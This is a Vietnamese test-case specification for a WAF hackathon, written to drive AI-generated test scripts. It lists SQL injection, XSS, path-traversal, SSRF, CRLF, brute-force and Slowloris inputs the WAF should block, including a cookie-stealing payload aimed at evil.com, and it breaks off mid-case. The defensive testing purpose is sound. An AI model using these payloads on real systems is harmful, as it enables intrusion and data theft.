# WAF Hackathon 2026 — Full Backend Test Cases

> **Mục đích:** Tài liệu này cung cấp toàn bộ test cases để Cursor (hoặc bất kỳ LLM coding assistant nào) generate test script tự động.
> **Target:** WAF reverse proxy chạy tại `WAF_BASE_URL` (default: `http://localhost:8080`)
> **Backend:** Ứng dụng thật chạy sau WAF — WAF là entry point duy nhất.

---

## Cấu trúc Test Case

Mỗi test case có:
- **ID**: định danh duy nhất
- **Category**: nhóm attack vector
- **Tier**: CRITICAL / HIGH / MEDIUM / CATCHALL
- **Method + Path**: HTTP method và endpoint
- **Headers**: request headers (nếu có)
- **Body**: request body (nếu có)
- **Expected Result**: `BLOCK` / `ALLOW` / `CHALLENGE` / `RATE_LIMITED`
- **Rule**: rule WAF phải trigger
- **Notes**: hướng dẫn bổ sung khi generate script

---

## Hướng dẫn Generate Script

Khi generate test script từ tài liệu này, hãy:

1. Đặt `WAF_BASE_URL = os.getenv("WAF_BASE_URL", "http://localhost:8080")` ở đầu file
2. Mỗi test case là một test function riêng biệt, đặt tên theo ID (`test_TC_SQL_001`, v.v.)
3. **Expected BLOCK**: assert `response.status_code in [400, 403, 429, 503]`
4. **Expected ALLOW**: assert `response.status_code in [200, 201, 204, 301, 302, 304]`
5. **Expected CHALLENGE**: assert `response.status_code in [403, 429]` hoặc body chứa challenge token/JS
6. **Expected RATE_LIMITED**: assert `response.status_code == 429`
7. Với test case có note "Gửi N lần": loop N requests, assert block sau ngưỡng
8. Với test case có `{{N}}` trong body/path: thay thế bằng biến counter trong loop
9. Thêm `time.sleep(0.05)` giữa requests trong loop tests (trừ khi test timing < 50ms)
10. Log kết quả mỗi test: ID, expected, actual status, pass/fail

---

## Category 1: SQL Injection (SQLi)

### TC-SQL-001 — Classic SQLi trong query param

- **Tier:** CATCHALL
- **Method:** GET
- **Path:** `/api/products?id=1' OR '1'='1`
- **Headers:**
  ```
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
  Accept: application/json
  ```
- **Body:** _(none)_
- **Expected:** `BLOCK`
- **Rule:** SQLi – classic OR bypass
- **Notes:** URL params phải bị scan. WAF phải detect `OR '1'='1` pattern.

---

### TC-SQL-002 — UNION-based SQLi

- **Tier:** HIGH
- **Method:** GET
- **Path:** `/api/users?id=1 UNION SELECT null,username,password FROM users--`
- **Headers:**
  ```
  User-Agent: Mozilla/5.0
  Accept: application/json
  ```
- **Body:** _(none)_
- **Expected:** `BLOCK`
- **Rule:** SQLi – UNION extraction
- **Notes:** UNION SELECT pattern phải bị detect trong query param.

---

### TC-SQL-003 — Blind SQLi time-based

- **Tier:** HIGH
- **Method:** GET
- **Path:** `/api/orders?id=1; WAITFOR DELAY '0:0:5'--`
- **Headers:**
  ```
  User-Agent: Mozilla/5.0
  ```
- **Body:** _(none)_
- **Expected:** `BLOCK`
- **Rule:** SQLi – time-based blind (WAITFOR / SLEEP)
- **Notes:** Cả `WAITFOR DELAY` (MSSQL) và `SLEEP(5)` (MySQL) phải bị detect.

---

### TC-SQL-004 — SQLi trong JSON body

- **Tier:** HIGH
- **Method:** POST
- **Path:** `/api/login`
- **Headers:**
  ```
  Content-Type: application/json
  User-Agent: Mozilla/5.0
  ```
- **Body:**
  ```json
  {"username": "admin' --", "password": "anything"}
  ```
- **Expected:** `BLOCK`
- **Rule:** SQLi – JSON body scan
- **Notes:** WAF phải parse và inspect JSON body, không chỉ URL params.

---

### TC-SQL-005 — SQLi URL-encoded trong header

- **Tier:** HIGH
- **Method:** GET
- **Path:** `/api/profile`
- **Headers:**
  ```
  X-User-Id: 1%27%20OR%20%271%27%3D%271
  User-Agent: Mozilla/5.0
  ```
- **Body:** _(none)_
- **Expected:** `BLOCK`
- **Rule:** SQLi – header scan + iterative URL decode
- **Notes:** `%27%20OR%20%271%27%3D%271` decode ra `' OR '1'='1`. WAF phải decode header values trước khi inspect.

---

### TC-SQL-006 — SQLi double URL-encoded

- **Tier:** CATCHALL
- **Method:** GET
- **Path:** `/search?q=1%2527%2520OR%25201%253D1`
- **Headers:** _(none)_
- **Body:** _(none)_
- **Expected:** `BLOCK`
- **Rule:** SQLi – double encoding bypass
- **Notes:** `%2527` → `%27` → `'`. WAF phải decode ít nhất 2 vòng (iterative decode up to 3 rounds).

---

### TC-SQL-007 — SQLi trong Cookie

- **Tier:** HIGH
- **Method:** GET
- **Path:** `/api/dashboard`
- **Headers:**
  ```
  Cookie: session=abc'; DROP TABLE users;--
  User-Agent: Mozilla/5.0
  ```
- **Body:** _(none)_
- **Expected:** `BLOCK`
- **Rule:** SQLi – Cookie header scan
- **Notes:** Cookie values phải được inspect như params.

---

## Category 2: Cross-Site Scripting (XSS)

### TC-XSS-001 — Reflected XSS trong query string

- **Tier:** CATCHALL
- **Method:** GET
- **Path:** `/search?q=<script>alert(1)</script>`
- **Headers:**
  ```
  User-Agent: Mozilla/5.0
  ```
- **Body:** _(none)_
- **Expected:** `BLOCK`
- **Rule:** XSS – reflected script tag
- **Notes:** Classic `<script>alert` pattern.

---

### TC-XSS-002 — XSS với onerror event handler

- **Tier:** CATCHALL
- **Method:** GET
- **Path:** `/page?ref=<img src=x onerror=alert(1)>`
- **Headers:** _(none)_
- **Body:** _(none)_
- **Expected:** `BLOCK`
- **Rule:** XSS – event handler injection
- **Notes:** `onerror`, `onload`, `onclick` event handlers phải bị detect.

---

### TC-XSS-003 — XSS trong JSON body (stored XSS path)

- **Tier:** HIGH
- **Method:** POST
- **Path:** `/api/comment`
- **Headers:**
  ```
  Content-Type: application/json
  User-Agent: Mozilla/5.0
  ```
- **Body:**
  ```json
  {"text": "<script>fetch('//evil.com/'+document.cookie)</script>"}
  ```
- **Expected:** `BLOCK`
- **Rule:** XSS – stored via JSON body
- **Notes:** Script injection trong JSON value phải bị detect.

---

### TC-XSS-004 — XSS URL-encoded

- **Tier:** CATCHALL
- **Method:** GET
- **Path:** `/page?msg=%3Cscript%3Ealert%281%29%3C%2Fscript%3E`
- **Headers:** _(none)_
- **Body:** _(none)_
- **Expected:** `BLOCK`
- **Rule:** XSS – URL encoded script tag
- **Notes:** `%3Cscript%3E` = `<script>`. WAF phải decode trước khi detect.

---

### TC-XSS-005 — XSS via SVG onload

- **Tier:** CATCHALL
- **Method:** GET
- **Path:** `/view?data=<svg/onload=alert(1)>`
- **Headers:** _(none)_
- **Body:** _(none)_
- **Expected:** `BLOCK`
- **Rule:** XSS – SVG onload vector
- **Notes:** SVG-based XSS vectors phải được cover.

---

### TC-XSS-006 — XSS javascript: URI

- **Tier:** CATCHALL
- **Method:** GET
- **Path:** `/redirect?url=javascript:alert(document.domain)`
- **Headers:** _(none)_
- **Body:** _(none)_
- **Expected:** `BLOCK`
- **Rule:** XSS – javascript: URI scheme
- **Notes:** `javascript:` URI trong redirect params phải bị block.

---

## Category 3: Path Traversal

### TC-PATH-001 — Path traversal raw `../`

- **Tier:** MEDIUM
- **Method:** GET
- **Path:** `/static/../../../etc/passwd`
- **Headers:** _(none)_
- **Body:** _(none)_
- **Expected:** `BLOCK`
- **Rule:** Path traversal – raw `../`
- **Notes:** Raw `../` sequences phải bị detect trong URL path.

---

### TC-PATH-002 — Path traversal URL encoded `%2e%2e`

- **Tier:** MEDIUM
- **Method:** GET
- **Path:** `/assets/%2e%2e%2f%2e%2e%2fetc%2fpasswd`
- **Headers:** _(none)_
- **Body:** _(none)_
- **Expected:** `BLOCK`
- **Rule:** Path traversal – `%2e%2e` encoded
- **Notes:** `%2e%2e%2f` = `../`. Phải decode trước khi check.

---

### TC-PATH-003 — Path traversal double encoded

- **Tier:** MEDIUM
- **Method:** GET
- **Path:** `/files/%252e%252e%252fetc%252fshadow`
- **Headers:** _(none)_
- **Body:** _(none)_
- **Expected:** `BLOCK`
- **Rule:** Path traversal – double encoded `%252e`
- **Notes:** `%252e` → `%2e` → `.`. Cần 2 rounds decode.

---

### TC-PATH-004 — Path traversal trong query param

- **Tier:** HIGH
- **Method:** GET
- **Path:** `/api/file?name=../../../../etc/hosts`
- **Headers:** _(none)_
- **Body:** _(none)_
- **Expected:** `BLOCK`
- **Rule:** Path traversal – query param `name`
- **Notes:** Traversal trong query params cũng phải bị detect (không chỉ URL path).

---

### TC-PATH-005 — Windows path traversal backslash

- **Tier:** CATCHALL
- **Method:** GET
- **Path:** `/download?file=..\\..\\windows\\system32\\drivers\\etc\\hosts`
- **Headers:** _(none)_
- **Body:** _(none)_
- **Expected:** `BLOCK`
- **Rule:** Path traversal – Windows `..\\` backslash
- **Notes:** Cả `/` và `\\` variants phải được cover.

---

### TC-PATH-006 — Path traversal null byte injection

- **Tier:** CATCHALL
- **Method:** GET
- **Path:** `/api/read?file=../../../etc/passwd%00.jpg`
- **Headers:** _(none)_
- **Body:** _(none)_
- **Expected:** `BLOCK`
- **Rule:** Path traversal – null byte `%00`
- **Notes:** Null byte dùng để truncate extension check.

---

## Category 4: SSRF

### TC-SSRF-001 — SSRF tới RFC-1918 range 192.168.x

- **Tier:** HIGH
- **Method:** POST
- **Path:** `/api/fetch`
- **Headers:**
  ```
  Content-Type: application/json
  User-Agent: Mozilla/5.0
  ```
- **Body:**
  ```json
  {"url": "http://192.168.1.1/admin"}
  ```
- **Expected:** `BLOCK`
- **Rule:** SSRF – RFC-1918 192.168.x block
- **Notes:** WAF phải block requests tới private IP ranges.

---

### TC-SSRF-002 — SSRF tới 10.x internal network

- **Tier:** HIGH
- **Method:** POST
- **Path:** `/api/webhook`
- **Headers:**
  ```
  Content-Type: application/json
  ```
- **Body:**
  ```json
  {"callback": "http://10.0.0.1:8080/internal"}
  ```
- **Expected:** `BLOCK`
- **Rule:** SSRF – 10.x private range block
- **Notes:** Toàn bộ `10.0.0.0/8` phải bị block.

---

### TC-SSRF-003 — SSRF AWS metadata endpoint

- **Tier:** HIGH
- **Method:** GET
- **Path:** `/proxy?target=http://169.254.169.254/latest/meta-data/`
- **Headers:** _(none)_
- **Body:** _(none)_
- **Expected:** `BLOCK`
- **Rule:** SSRF – link-local metadata endpoint (169.254.x)
- **Notes:** AWS/GCP/Azure metadata endpoints đều phải bị block.

---

### TC-SSRF-004 — SSRF localhost loopback

- **Tier:** HIGH
- **Method:** POST
- **Path:** `/api/render`
- **Headers:**
  ```
  Content-Type: application/json
  ```
- **Body:**
  ```json
  {"url": "http://127.0.0.1:6379"}
  ```
- **Expected:** `BLOCK`
- **Rule:** SSRF – localhost 127.0.0.1
- **Notes:** `127.0.0.1`, `::1`, `localhost` đều phải bị block.

---

### TC-SSRF-005 — SSRF decimal IP encoding (127.0.0.1)

- **Tier:** HIGH
- **Method:** GET
- **Path:** `/fetch?url=http://2130706433/`
- **Headers:** _(none)_
- **Body:** _(none)_
- **Expected:** `BLOCK`
- **Rule:** SSRF – decimal IP = 127.0.0.1 (DNS rebinding guard)
- **Notes:** `2130706433` = `0x7F000001` = `127.0.0.1`. WAF phải normalize IP representation.

---

### TC-SSRF-006 — SSRF IPv6 loopback

- **Tier:** HIGH
- **Method:** POST
- **Path:** `/api/check`
- **Headers:**
  ```
  Content-Type: application/json
  ```
- **Body:**
  ```json
  {"url": "http://[::1]:8080/admin"}
  ```
- **Expected:** `BLOCK`
- **Rule:** SSRF – IPv6 loopback `::1`
- **Notes:** IPv6 variants cũng phải bị block.

---

## Category 5: HTTP Header Injection

### TC-HDR-001 — CRLF injection / response splitting

- **Tier:** CATCHALL
- **Method:** GET
- **Path:** `/redirect?url=http://example.com%0d%0aSet-Cookie:+session=hacked`
- **Headers:** _(none)_
- **Body:** _(none)_
- **Expected:** `BLOCK`
- **Rule:** Header injection – CRLF `%0d%0a`
- **Notes:** `%0d%0a` = `\r\n`. Response splitting attack.

---

### TC-HDR-002 — Host header injection

- **Tier:** CATCHALL
- **Method:** GET
- **Path:** `/`
- **Headers:**
  ```
  Host: evil.com
  User-Agent: Mozilla/5.0
  ```
- **Body:** _(none)_
- **Expected:** `BLOCK`
- **Rule:** Header injection – Host header override
- **Notes:** Host header phải match configured domains.

---

### TC-HDR-003 — X-Forwarded-For chain bất thường (nhiều hops)

- **Tier:** HIGH
- **Method:** POST
- **Path:** `/login`
- **Headers:**
  ```
  X-Forwarded-For: 127.0.0.1, 10.0.0.1, 172.16.0.1, 1.2.3.4
  Content-Type: application/json
  User-Agent: Mozilla/5.0
  ```
- **Body:**
  ```json
  {"username": "user", "password": "pass"}
  ```
- **Expected:** `BLOCK`
- **Rule:** Relay – abnormal XFF chain (multiple private hops)
- **Notes:** XFF chain chứa nhiều private IPs là dấu hiệu proxy chain injection.

---

### TC-HDR-004 — X-Forwarded-For giả IP private để bypass rate limit

- **Tier:** CRITICAL
- **Method:** POST
- **Path:** `/login`
- **Headers:**
  ```
  X-Forwarded-For: 127.0.0.1
  Content-Type: application/json
  User-Agent: Mozilla/5.0
  ```
- **Body:**
  ```json
  {"username": "admin", "password": "admin"}
  ```
- **Expected:** `BLOCK`
- **Rule:** Relay – XFF private IP bypass attempt
- **Notes:** WAF không được trust XFF blindly. Phải validate source IP thực.

---

### TC-HDR-005 — X-Debug / X-Internal header leak trong response (outbound)

- **Tier:** HIGH
- **Method:** GET
- **Path:** `/api/data`
- **Headers:**
  ```
  User-Agent: Mozilla/5.0
  ```
- **Body:** _(none)_
- **Expected:** `BLOCK` (response bị filter, header bị strip)
- **Rule:** Outbound – X-Debug / X-Internal header strip
- **Notes:** WAF phải strip `X-Debug-*`, `X-Internal-*` từ backend response trước khi trả về client.

---

## Category 6: Brute Force / Credential Stuffing

### TC-BF-001 — Brute force login — cùng IP, nhiều password

- **Tier:** CRITICAL
- **Method:** POST
- **Path:** `/login`
- **Headers:**
  ```
  Content-Type: application/json
  User-Agent: Mozilla/5.0
  ```
- **Body** (lặp 20 lần, thay `{{N}}` bằng counter):
  ```json
  {"username": "admin", "password": "password{{N}}"}
  ```
- **Expected:** `BLOCK` (sau request thứ 5-10)
- **Rule:** Brute force – rate limit per-IP on CRITICAL tier
- **Notes:** Gửi 20 requests liên tiếp. Assert WAF block (403/429) trước request thứ 15.

---

### TC-BF-002 — Password spraying — nhiều username, 1 password

- **Tier:** CRITICAL
- **Method:** POST
- **Path:** `/login`
- **Headers:**
  ```
  Content-Type: application/json
  User-Agent: Mozilla/5.0
  ```
- **Body** (lặp 20 lần, thay `{{N}}` bằng counter):
  ```json
  {"username": "user{{N}}@example.com", "password": "Summer2024!"}
  ```
- **Expected:** `BLOCK`
- **Rule:** Brute force – password spray pattern detection
- **Notes:** Cùng password + nhiều username từ cùng IP = spray pattern.

---

### TC-BF-003 — Distributed credential stuffing — 5 IP khác nhau

- **Tier:** CRITICAL
- **Method:** POST
- **Path:** `/login`
- **Headers** (thay đổi IP qua X-Forwarded-For nếu WAF trust header này, hoặc dùng 5 client thực):
  ```
  Content-Type: application/json
  X-Forwarded-For: {{IP_N}}
  ```
- **Body:**
  ```json
  {"username": "victim@example.com", "password": "leaked_password_123"}
  ```
- **Expected:** `CHALLENGE` hoặc `BLOCK`
- **Rule:** Brute force – distributed multi-IP same target user
- **Notes:** 5 IP khác nhau cùng attack 1 user. Behavioral pattern phải trigger.

---

### TC-BF-004 — OTP brute force

- **Tier:** CRITICAL
- **Method:** POST
- **Path:** `/otp`
- **Headers:**
  ```
  Content-Type: application/json
  Cookie: session=valid_session_token
  ```
- **Body** (lặp 10 lần với OTP khác nhau):
  ```json
  {"otp": "{{000000 to 999999}}"}
  ```
- **Expected:** `BLOCK` (sau 3-5 lần fail)
- **Rule:** Brute force – OTP enumeration on CRITICAL tier
- **Notes:** OTP endpoint phải có strict rate limit (3-5 attempts max).

---

### TC-BF-005 — Login với thông tin hợp lệ sau brute force timeout (sanity)

- **Tier:** CRITICAL
- **Method:** POST
- **Path:** `/login`
- **Headers:**
  ```
  Content-Type: application/json
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
  ```
- **Body:**
  ```json
  {"username": "legitimate_user", "password": "correct_password"}
  ```
- **Expected:** `ALLOW`
- **Rule:** Sanity – legitimate login không bị false positive
- **Notes:** Dùng IP mới/sạch. Đây là false positive check quan trọng.

---

## Category 7: DDoS / Rate Limiting

### TC-DDOS-001 — HTTP flood 500 req/s cùng IP

- **Tier:** HIGH
- **Method:** GET
- **Path:** `/game/lobby`
- **Headers:**
  ```
  User-Agent: Mozilla/5.0
  ```
- **Body:** _(none)_
- **Expected:** `BLOCK` / `RATE_LIMITED`
- **Rule:** DDoS – burst threshold exceeded
- **Notes:** Dùng `wrk` hoặc `ab` để gửi 500 req/s. Token bucket phải trigger sau threshold.

---

### TC-DDOS-002 — Slowloris attack (header gửi chậm)

- **Tier:** CATCHALL
- **Method:** GET
- **Path:** `/`
- **Headers** (gửi từng header một, mỗi header delay 5-10 giây, không gửi `\r\n\r\n` kết thúc):
  ```
  User-Agent: Mozilla/5.0
  X-Slowloris-Header-1: keep-going
  X-Slowloris-Header-2: still-here
  ```
- **Body:** _(none)_
- **Expected:** `BLOCK` (connection timeout / reset)
- **Rule:** DDoS – Slowloris connection timeout
- **Notes:** WAF phải có connection read timeout. Assert TCP connection bị reset sau N giây.

---

### TC-DDOS-003 — CRITICAL tier fail-close khi WAF stress

- **Tier:** CRITICAL
- **Method:** POST
- **Path:** `/deposit`
- **Headers:**
  ```
  Content-Type: application/json
  Cookie: session=test_session
  ```
- **Body:**
  ```json
  {"amount": 100}
  ```
- **Expected:** `BLOCK` (503 fail-close)
- **Rule:** Graceful degradation – fail-close CRITICAL tier
- **Notes:** Test khi WAF đang bị DDoS. CRITICAL tier phải deny all, không pass-through.

---

### TC-DDOS-004 — MEDIUM tier fail-open khi WAF stress

- **Tier:** MEDIUM
- **Method:** GET
- **Path:** `/static/app.js`
- **Headers:**
  ```
  User-Agent: Mozilla/5.0
  ```
- **Body:** _(none)_
- **Expected:** `ALLOW` (pass-through khi WAF overloaded)
- **Rule:** Graceful degradation – fail-open MEDIUM tier
- **Notes:** Ngược với DDOS-003. Static assets phải accessible khi WAF stress.

---

### TC-DDOS-005 — Rate limit per-session (khác per-IP)

- **Tier:** HIGH
- **Method:** GET
- **Path:** `/api/search`
- **Headers:**
  ```
  Cookie: session=sess_abc123_high_volume
  User-Agent: Mozilla/5.0
  ```
- **Body:** _(none)_
- **Expected:** `RATE_LIMITED` (sau threshold)
- **Rule:** Rate limit – per-session sliding window
- **Notes:** Gửi 100 requests với cùng session token. Session rate limit phải trigger độc lập với IP rate limit.

---

### TC-DDOS-006 — Backend down → Circuit breaker → 503

- **Tier:** HIGH
- **Method:** GET
- **Path:** `/api/orders`
- **Headers:**
  ```
  User-Agent: Mozilla/5.0
  ```
- **Body:** _(none)_
- **Expected:** `BLOCK` (503 response từ WAF trong < 1 giây)
- **Rule:** Circuit breaker – upstream backend unreachable
- **Notes:** Shutdown backend trước khi test. WAF phải trả 503 ngay, không hang connection.

---

## Category 8: Recon / Scanning

### TC-RECON-001 — Canary endpoint `/admin-test` hit

- **Tier:** CATCHALL
- **Method:** GET
- **Path:** `/admin-test`
- **Headers:**
  ```
  User-Agent: Mozilla/5.0
  ```
- **Body:** _(none)_
- **Expected:** `BLOCK` (risk score = MAX, IP blacklisted ngay)
- **Rule:** Canary – honeypot `/admin-test` trigger
- **Notes:** Chỉ cần 1 request. Sau đó, mọi request từ IP đó phải bị block.

---

### TC-RECON-002 — Canary endpoint `/api-debug` hit

- **Tier:** CATCHALL
- **Method:** GET
- **Path:** `/api-debug`
- **Headers:** _(none)_
- **Body:** _(none)_
- **Expected:** `BLOCK`
- **Rule:** Canary – honeypot `/api-debug` trigger
- **Notes:** Tương tự RECON-001. Verify IP bị block sau khi hit canary.

---

### TC-RECON-003 — Rapid 404 scanning (30 routes trong 10 giây)

- **Tier:** CATCHALL
- **Method:** GET
- **Path** (lặp 30 lần với path random):
  ```
  /random-path-{{N}}
  /nonexistent-{{N}}
  /admin-{{N}}
  ```
- **Headers:**
  ```
  User-Agent: python-requests/2.31.0
  ```
- **Body:** _(none)_
- **Expected:** `BLOCK` (sau khoảng 15-20 lần 404)
- **Rule:** Recon – rapid 4xx enumeration pattern
- **Notes:** 30+ 404s trong 10 giây = endpoint enumeration. Block IP sau threshold.

---

### TC-RECON-004 — OPTIONS method abuse

- **Tier:** HIGH
- **Method:** OPTIONS
- **Path:** `/api/users`
- **Headers:**
  ```
  Origin: https://evil-attacker.com
  Access-Control-Request-Method: GET
  ```
- **Body:** _(none)_
- **Expected:** `CHALLENGE` hoặc `BLOCK`
- **Rule:** Recon – OPTIONS method abuse / CORS probe
- **Notes:** Repeated OPTIONS từ suspicious origin phải trigger.

---

### TC-RECON-005 — Scanner User-Agent: sqlmap

- **Tier:** CATCHALL
- **Method:** GET
- **Path:** `/api/products?id=1`
- **Headers:**
  ```
  User-Agent: sqlmap/1.7.11#stable (https://sqlmap.org)
  ```
- **Body:** _(none)_
- **Expected:** `BLOCK`
- **Rule:** Scanner detection – sqlmap User-Agent
- **Notes:** Known scanner UAs phải bị block ngay cả khi payload không có gì nguy hiểm.

---

### TC-RECON-006 — Scanner User-Agent: Nikto

- **Tier:** CATCHALL
- **Method:** GET
- **Path:** `/`
- **Headers:**
  ```
  User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)
  ```
- **Body:** _(none)_
- **Expected:** `BLOCK`
- **Rule:** Scanner detection – Nikto User-Agent
- **Notes:** Nikto UA phải bị detect và block.

---

### TC-RECON-007 — Scanner User-Agent: Nmap scripting

- **Tier:** CATCHALL
- **Method:** GET
- **Path:** `/`
- **Headers:**
  ```
  User-Agent: Nmap Scripting Engine
  ```
- **Body:** _(none)_
- **Expected:** `BLOCK`
- **Rule:** Scanner detection – Nmap NSE User-Agent
- **Notes:** Nmap HTTP script scanner.

---

## Category 9: Behavioral Anomaly

### TC-BEH-001 — Zero-depth session vào `/deposit` (bỏ qua homepage)

- **Tier:** CRITICAL
- **Method:** POST
- **Path:** `/deposit`
- **Headers:**
  ```
  Content-Type: application/json
  Cookie: session=brand_new_session_never_visited_homepage
  ```
- **Body:**
  ```json
  {"amount": 10000, "to": "attacker_account"}
  ```
- **Expected:** `BLOCK`
- **Rule:** Behavioral – zero-depth session to CRITICAL route
- **Notes:** Session chưa từng hit homepage/login trước đó mà trực tiếp vào `/deposit` = bất thường. WAF phải track session depth.

---

### TC-BEH-002 — Bot timing quá đều (inter-request < 50ms)

- **Tier:** HIGH
- **Method:** GET
- **Path:** `/game/state`
- **Headers:**
  ```
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
  Cookie: session=game_session_123
  ```
- **Body:** _(none)_
- **Expected:** `CHALLENGE`
- **Rule:** Behavioral – robotic timing interval < 50ms
- **Notes:** Gửi 20 requests với interval đúng 48ms mỗi lần. Human timing variation không bao giờ đều như vậy.

---

### TC-BEH-003 — Thiếu Referer trên `/withdrawal`

- **Tier:** CRITICAL
- **Method:** POST
- **Path:** `/withdrawal`
- **Headers:**
  ```
  Content-Type: application/json
  Cookie: session=valid_authenticated_session
  ```
  _(Không có Referer header)_
- **Body:**
  ```json
  {"amount": 500, "to_account": "target"}
  ```
- **Expected:** `CHALLENGE`
- **Rule:** Behavioral – missing Referer on sensitive financial route
- **Notes:** Legitimate browser luôn gửi Referer khi navigate từ trang khác. Thiếu Referer = bot/script.

---

### TC-BEH-004 — Cùng device fingerprint, đổi IP liên tục

- **Tier:** CRITICAL
- **Method:** POST
- **Path:** `/login`
- **Headers** (giữ nguyên TLS JA3, UA, Accept-Encoding; chỉ đổi source IP):
  ```
  Content-Type: application/json
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
  Accept-Encoding: gzip, deflate, br
  Accept-Language: en-US,en;q=0.9
  ```
- **Body:**
  ```json
  {"username": "victim_user{{N}}", "password": "wrong_password"}
  ```
- **Expected:** `BLOCK`
- **Rule:** Device fingerprint – IP rotation evasion (same device, multiple IPs)
- **Notes:** JA3 fingerprint + UA + Accept-Encoding combo tạo device ID bền vững. Đổi IP không bypass được.

---

### TC-BEH-005 — Request flood với perfectly timed intervals (advanced bot)

- **Tier:** HIGH
- **Method:** GET
- **Path:** `/api/prices`
- **Headers:**
  ```
  User-Agent: Mozilla/5.0
  Accept: application/json
  ```
- **Body:** _(none)_
- **Expected:** `CHALLENGE`
- **Rule:** Behavioral – perfectly timed bot (zero variance in timing)
- **Notes:** Gửi 50 requests với interval chính xác 100ms (± 0ms). Standard deviation = 0 là bất thường.

---

## Category 10: Transaction Fraud

### TC-FRAUD-001 — Login → Deposit trong 3 giây

- **Tier:** CRITICAL
- **Method:** POST
- **Path:** `/deposit`
- **Headers:**
  ```
  Content-Type: application/json
  Cookie: session=just_logged_in_3_seconds_ago
  ```
- **Body:**
  ```json
  {"amount": 50000, "currency": "VND"}
  ```
- **Expected:** `BLOCK`
- **Rule:** Transaction velocity – Login→Deposit interval < 5 seconds
- **Notes:** Sequence: POST /login (t=0) → POST /deposit (t=3s). WAF phải track cross-endpoint timing.

---

### TC-FRAUD-002 — Withdrawal ngay sau Deposit (< 10 giây)

- **Tier:** CRITICAL
- **Method:** POST
- **Path:** `/withdrawal`
- **Headers:**
  ```
  Content-Type: application/json
  Cookie: session=just_deposited_session
  ```
- **Body:**
  ```json
  {"amount": 50000}
  ```
- **Expected:** `BLOCK`
- **Rule:** Transaction velocity – Deposit→Withdrawal rapid sequence
- **Notes:** Sequence: POST /deposit (t=0) → POST /withdrawal (t<10s). Money laundering pattern.

---

### TC-FRAUD-003 — Rapid limit-change sau đó Withdrawal lớn

- **Tier:** CRITICAL
- **Method:** POST
- **Path:** `/withdrawal`
- **Headers:**
  ```
  Content-Type: application/json
  Cookie: session=changed_limit_session
  ```
- **Body:**
  ```json
  {"amount": 999999}
  ```
- **Expected:** `BLOCK`
- **Rule:** Transaction velocity – limit-change + large withdrawal pattern
- **Notes:** Sequence: POST /api/user/limit (t=0) → POST /withdrawal (t<30s, amount > old limit).

---

### TC-FRAUD-004 — Normal flow: Login → OTP → Deposit (sanity check)

- **Tier:** CRITICAL
- **Method:** POST
- **Path:** `/deposit`
- **Headers:**
  ```
  Content-Type: application/json
  Cookie: session=completed_full_auth_flow
  Referer: https://yourapp.com/dashboard
  ```
- **Body:**
  ```json
  {"amount": 100}
  ```
- **Expected:** `ALLOW`
- **Rule:** Transaction sequence – complete normal flow must pass
- **Notes:** **False positive check.** Sequence: /login (t=0) → /otp (t=5s) → /deposit (t=30s). Phải ALLOW.

---

### TC-FRAUD-005 — Multi-session deposit từ cùng user account

- **Tier:** CRITICAL
- **Method:** POST
- **Path:** `/deposit`
- **Headers:**
  ```
  Content-Type: application/json
  Cookie: session=session_device_B
  ```
- **Body:**
  ```json
  {"amount": 25000}
  ```
- **Expected:** `CHALLENGE`
- **Rule:** Transaction velocity – concurrent sessions same user
- **Notes:** Cùng user_id nhưng 2 session khác nhau đang active đồng thời.

---

## Category 11: Device Fingerprinting

### TC-DEV-001 — Rotate User-Agent mỗi request

- **Tier:** HIGH
- **Method:** GET
- **Path:** `/game/play`
- **Headers** (thay đổi UA mỗi request):
  ```
  User-Agent: {{ROTATING_UA_FROM_LIST}}
  ```
  _UA list: Chrome/120, Firefox/121, Safari/17, Edge/120, Opera/106_
- **Body:** _(none)_
- **Expected:** `CHALLENGE`
- **Rule:** Device fingerprint – high UA entropy / rotation
- **Notes:** Kết hợp với stable JA3 fingerprint tạo mâu thuẫn device profile.

---

### TC-DEV-002 — TLS fingerprint thay đổi (JA3 rotation)

- **Tier:** CRITICAL
- **Method:** POST
- **Path:** `/login`
- **Headers:**
  ```
  Content-Type: application/json
  ```
- **Body:**
  ```json
  {"username": "target_user", "password": "wrong_pass"}
  ```
- **Expected:** `BLOCK`
- **Rule:** Device fingerprint – JA3/JA4 inconsistency after block
- **Notes:** Bị block lần 1 (IP A, JA3_A) → thử lại (IP B, JA3_B khác) = evasion attempt.

---

### TC-DEV-003 — Residential IP giả mạo nhưng datacenter TLS fingerprint

- **Tier:** CRITICAL
- **Method:** POST
- **Path:** `/login`
- **Headers:**
  ```
  Content-Type: application/json
  X-Forwarded-For: 1.2.3.4
  ```
- **Body:**
  ```json
  {"username": "admin", "password": "test"}
  ```
- **Expected:** `CHALLENGE`
- **Rule:** Device fingerprint – ASN/TLS mismatch (datacenter JA3 + residential IP)
- **Notes:** JA3 từ datacenter library (Python requests, curl) nhưng IP là residential = bất thường.

---

## Category 12: Request Body Abuse

### TC-BODY-001 — Malformed JSON body

- **Tier:** HIGH
- **Method:** POST
- **Path:** `/api/login`
- **Headers:**
  ```
  Content-Type: application/json
  User-Agent: Mozilla/5.0
  ```
- **Body:**
  ```
  {username: admin, "password: pass}
  ```
  _(JSON không hợp lệ — thiếu quotes, bracket không đóng)_
- **Expected:** `BLOCK`
- **Rule:** Body abuse – malformed JSON
- **Notes:** WAF phải detect malformed JSON với Content-Type: application/json.

---

### TC-BODY-002 — Oversized payload (> configured limit)

- **Tier:** HIGH
- **Method:** POST
- **Path:** `/api/upload`
- **Headers:**
  ```
  Content-Type: application/octet-stream
  Content-Length: 10485760
  User-Agent: Mozilla/5.0
  ```
- **Body:** _(10MB+ binary data)_
- **Expected:** `BLOCK`
- **Rule:** Body abuse – oversized payload exceeds configurable limit
- **Notes:** Default limit thường 1MB-10MB. Generate với `dd if=/dev/urandom bs=1M count=11`.

---

### TC-BODY-003 — Deeply nested JSON (depth > 50)

- **Tier:** HIGH
- **Method:** POST
- **Path:** `/api/config`
- **Headers:**
  ```
  Content-Type: application/json
  ```
- **Body:**
  ```json
